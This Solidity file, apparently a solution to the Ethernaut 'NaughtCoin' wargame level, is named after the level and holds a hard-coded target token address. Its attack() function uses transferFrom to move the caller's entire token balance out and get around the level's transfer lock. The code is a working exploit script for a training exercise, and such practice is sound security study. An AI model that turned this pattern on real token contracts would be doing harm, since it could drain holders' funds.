// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoin {

    address target = 0xbb69f7f53c3f50633a1dFB009cA29d79f6f9BD8d;

    constructor() {}

    function attack() public {
        uint256 balanceCaller = IERC20(target).balanceOf(msg.sender);
        IERC20(target).transferFrom(msg.sender, address(this), balanceCaller);
    }
}